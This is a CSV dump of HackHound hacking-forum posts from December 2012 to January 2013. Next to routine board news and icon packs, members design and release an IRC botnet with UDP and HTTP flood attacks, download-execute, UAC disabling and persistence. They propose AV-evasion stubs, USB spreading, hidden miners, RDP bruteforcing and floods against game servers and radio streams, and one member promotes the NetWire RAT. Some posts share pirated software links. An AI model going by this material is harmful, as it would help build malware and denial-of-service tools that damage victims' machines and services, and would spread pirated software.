subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
BLUESTACKS ANDROID APP PLAYER FOR PC - Resources Sources - HackHound,bluestacks-android-app-player-for-pc,Cobra,12/18/2012 0:00,BlueStacks' NEW Android App Player for PC. Run android apps on Windows PC. Soon you'll also be able to run android apps on Mac. Check and Enjoy. http://bluestacks.com download link: http://www.bluestack...d-success-2.htm,IntermediateMember
BLUESTACKS ANDROID APP PLAYER FOR PC - Resources Sources - HackHound,bluestacks-android-app-player-for-pc,x58,12/19/2012 0:00,Yeah have seen this before and tried it. It is cool. But just a modification of the android dev toolkit. The program is based on the lib and i believe engine of the android emulator from the toolkit. It works just fine they made their own rom and or kernel for it idk. Useful for those who would like to play android games/apps on their computer.,Advanced
DaRel - Reverse Proxy Data Relay  [stage1] - Team Projects - HackHound,darel-reverse-proxy-data-relay-stage1,Dante,12/21/2012 0:00,I admit to be late on this project but I won't have any free time left for this until the new years. Job is killing me. Please bare with me guys.,IntermediateMember
IPB software update - Archive - HackHound,ipb-software-update,Ravage,12/22/2012 0:00,"We'll be upgrading board software this next few days. Some modifications might happen and some other things might not even work, skin included. Just keeping everybody informed.",Expert
IPB software update - Archive - HackHound,ipb-software-update,Ravage,12/22/2012 0:00,"Well seems that problems just began. Skin doesn't work properly indeed so we will have to fix this in the next few days. We also tried a few more with same results. We will have to use default skin until everything is sorted, otherwise no member will be able to post or start a new topic. Sorry for this guys but at the moment we have no choice. It will be fixed a.s.a.p.",Expert
Visual Studio 2012 ISO - MSDN - Development Software - HackHound,visual-studio-2012-iso-msdn,BlackArray,12/23/2012 0:00,Visual Studio 2012. 7.33 GB http://thepiratebay....2012_ISO_-_MSDN Dont forget to seed.,IntermediateMember
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,BlackArray,12/23/2012 0:00,"- Hackhound IRC Bot - Since Hackhound is pretty much dead right now and hardly any member here contributes, i decided its time to code something that would help bringing Hackhound back to what it was. - Project General Information - * Programmer - BlackAr",IntermediateMember
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,HttP-NuKe,12/23/2012 0:00,"ummm, you could try using CodeDom what way the stub will be UD longer",AdvancedMember
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,HttP-NuKe,12/23/2012 0:00,you could add : command prompt remote registry usb spread,AdvancedMember
IPB software update - Archive - HackHound,ipb-software-update,Ravage,12/23/2012 0:00,I've loaded a temporary skin until everything is sorted.,Expert
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,Ravage,12/26/2012 0:00,"Here are included all members that did participate on this event. Members are now asked to vote on this poll selecting the participant that on their opinion deserves to be the winner of this event. This poll will be open until January 1st, 2013. Good luck guys. Edited by Ravage, 01 January 2013 - 09:01 PM. spelling error",Expert
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,Dante,12/27/2012 0:00,Voted,IntermediateMember
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,x58,12/27/2012 0:00,If there was a way to vote for 2.. Than i choose for 3x1337 and http-nuke. Anyways thats not possible so i voted on 3x1337. Both of you are great. Good luck.,Advanced
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,BlackArray,12/28/2012 0:00,"ummm, you could try using CodeDom what way the stub will be UD longer you could add : command prompt remote registry usb spread Codedom will be used. Remote registry via IRC? No. USB Spread alright. Remote Shell (command prompt) no, because IRC.",IntermediateMember
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,HttP-NuKe,12/28/2012 0:00,thanks for your support mate good luck 3x1337,AdvancedMember
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,x58,12/28/2012 0:00,"What about a these features: Bitcoin miner CPU & GPU not in java because java sucks for it, like diablominer (Full load when afk for ) UDP Anti-lag mechanisms Flood (for games that are based on the source engine http://revuln.com/fi...nline_Games.pdf) Source engine server query flood. Yes it still works. Can take down tons of servers. Just fun to see it happen. Hidden Add/Website viewer P2P Seeder (Basic, doesn't have to be advanced) RPD Bruteforce (Like rdprobe) Icecast Flood (making tons of fake clients, that don't request the meta header. Will cause lag and sometimes crashes) Fun for taking down internet radio shows/streams and shit. I have tons of more fun things but those are the coolest. Thats it for now i guess.",Advanced
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,BlackArray,12/28/2012 0:00,"What about a these features: Bitcoin miner CPU & GPU not in java because java sucks for it, like diablominer (Full load when afk for ) UDP Anti-lag mechanisms Flood (for games that are based on the source engine http://revuln.com/fi...nline_Games.pdf) Source engine server query flood. Yes it still works. Can take down tons of servers. Just fun to see it happen. Hidden Add/Website viewer P2P Seeder (Basic, doesn't have to be advanced) RPD Bruteforce (Like rdprobe) Icecast Flood (making tons of fake clients, that don't request the meta header. Will cause lag and sometimes crashes) Fun for taking down internet radio shows/streams and shit. I have tons of more fun things but those are the coolest. Thats it for now i guess. Bruteforce will not be added in this project. BitTorrent Seeder maybe. Website viewer yes. Bitcoin Miner not in this project.UDP anti-lag... and Icecast floods wont be added, because you can use other available methods to do the same. I don't want this project to be over-bloated with features, only the minimum needed. Thank you for your suggestions.",IntermediateMember
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,Dante,12/28/2012 0:00,Good luck for all actually.,IntermediateMember
HH IRC Bot (Version: 1.0 Build 0001) - Team Projects - HackHound,hh-irc-bot-version-10-build-0001,BlackArray,12/29/2012 0:00,Hackhound.org Official IRC Bot Supported Operating Systems: (Tested on) Windows XP x86/x64 Windows Vista x86/x64 Windows 7 x86/x64 Windows 8 x86/x64 Core Bot Features: HKCU Startup HKLM Startup Disable UAC Melt Registry Persistence Bot Features: UDP Flood HTTP GET Flood HTTP POST Flood ConDis Flood HTTP Torhammer Flood HTTP Hulk Flood Download-Execute Update Bot Control Features: Accepts commands only from specified Master in Builder. ToDo: SSL Support Channel Password Support Bug fixes? If any. Please report any bugs VIA PM or Use the specified Contact information in my profile. Attached Files HH IRC beta.zip 293.8KB 158 downloads hh cmd list.txt.txt 182bytes 105 downloads,IntermediateMember
HH IRC Bot (Version: 1.0 Build 0001) - Team Projects - HackHound,hh-irc-bot-version-10-build-0001,x58,12/29/2012 0:00,Nice release. I'm also about to release stuff. But i had some small problems.,Advanced
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,Mr52,12/30/2012 0:00,"Just want to Let you all know i own this RAT and i recommend this to all of you Dugidox has the best support ever you find, He will be almost online all the times he does reply for all the tickets you asked for almost instantly. The Development of this RAT is soo fast and the supported platforms is vast. This is Unique RAT so donot hesitate to try one B.T.W @Dugidox im 7 if you are figuring out who am i",Beginner
HH IRC Bot (Version: 1.0 Build 0001) - Team Projects - HackHound,hh-irc-bot-version-10-build-0001,BlackArray,12/30/2012 0:00,"Gonna end this project. I thought, how will re-inventing the wheel bring HH back to what it was? The answer is, it wont. I am already working on a new project, for HH, similar to this. Stay tuned. Also, please close this thread.",IntermediateMember
HH IRC Bot (Version: 1.0 Build 0001) - Team Projects - HackHound,hh-irc-bot-version-10-build-0001,x58,12/30/2012 0:00,Closed on request.,Advanced
HH IRC Bot Discussion - Team Projects - HackHound,hh-irc-bot-discussion,x58,12/30/2012 0:00,Same for this one. Closed on request.,Advanced
4.4k 32x32 24-bit Icons - General Discussion - HackHound,44k-32x32-24-bit-icons,x58,12/31/2012 0:00,"Here is a icon pack that i would like to share with HackHound. Quantity: 4400~ Icons Resolution: 32x32 (Maybe a few 16x16, not sure) Bitmap: 24-bit true color (Maybe also a few 16-bit) Most of them are really old, but a few of them are still cool to use. Credits: Coders.TK from back in 2005 - 2009. Enjoy. Attached Files 4.4k Icons.rar 9.11MB 28 downloads",Advanced
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,dugidox,12/31/2012 0:00,"Just want to Let you all know i own this RAT and i recommend this to all of you Dugidox has the best support ever you find, He will be almost online all the times he does reply for all the tickets you asked for almost instantly. The Development of this RAT is soo fast and the supported platforms is vast. This is Unique RAT so donot hesitate to try one B.T.W @Dugidox im 7 if you are figuring out who am i Thanks for nice review, and btw fuck you, you didn't come online for loooong time",Banned
4.4k 32x32 24-bit Icons - General Discussion - HackHound,44k-32x32-24-bit-icons,x58,12/31/2012 0:00,Nice share i have some nice tip too 16x16 icons http://www.cool-web....ist_size_16.htm 32x32 icons http://www.cool-web....ist_size_32.htmO well thanks for the info. I tried to dl them all but the problem i usef for it to dl can't handle that much random links in it. Starts with 100 ends with ~400.,Advanced
NetWire Remote Control - Verified Sellers - HackHound,netwire-remote-control,Mr52,1/1/2013 0:00,@dugidox Sorry for Offtopic I was kinda busy with real life managing around 17 servers which makes my life hell with frequent updates and lots of trouble shootings and stuff and with in less time i need to be at JOB and learn something sleep damn hard jus,Beginner
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,Ravage,1/1/2013 0:00,3x1337 and http-nuke will be submitted to staff vote now. Thanks guys.,Expert
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,Guest_winner13_*,1/2/2013 0:00,"Failed to download, upload the file again.",NULL
Delphi 7 Personal + second edition + decompiler - Development Software - HackHound,delphi-7-personal-second-edition-decompiler,julio,1/4/2013 0:00,http://rapidshare.co...71256838/D7.rar,Member
MSDN for VB6 - Development Software - HackHound,msdn-for-vb6,julio,1/4/2013 0:00,"msdn for vb6 http://rapidshare.co...dn_oct_2001.iso MSDN Library is a library of official technical documentation content intended for developers developing for Microsoft Windows. MSDN stands for the Microsoft Developer Network. The MSDN Library documents the APIs that ship with Microsoft products and also includes sample code, technical articles, and other programming information The MSDN Library includes how-to and reference documentation, sample code, technical articles, and more. To find the content you need, browse the table of contents, use search, or use a Quick Link to jump to some of the most popular areas of the library",Member
indy for delphi 4 till 7 (pas2dcu) - Extra - HackHound,indy-for-delphi-4-till-7-pas2dcu,julio,1/4/2013 0:00,indy for delphi 4 till 7 Attached Files Indy_9_00_17_src.rar 908.89KB 45 downloads,Member
Exidous AV Signature Tool - Malware Related Tools - HackHound,exidous-av-signature-tool,Cobra,1/4/2013 0:00,EXE Splitter Attached Files Exidous AV Signature Tool.rar 33.78KB 479 downloads,IntermediateMember
HackHound Fever Poll - Challenges - HackHound,hackhound-fever-poll,Ravage,1/4/2013 0:00,3x1337 is the new moderator. Sorry http-nuke. Maybe next time. Thanks to all the participants.,Expert
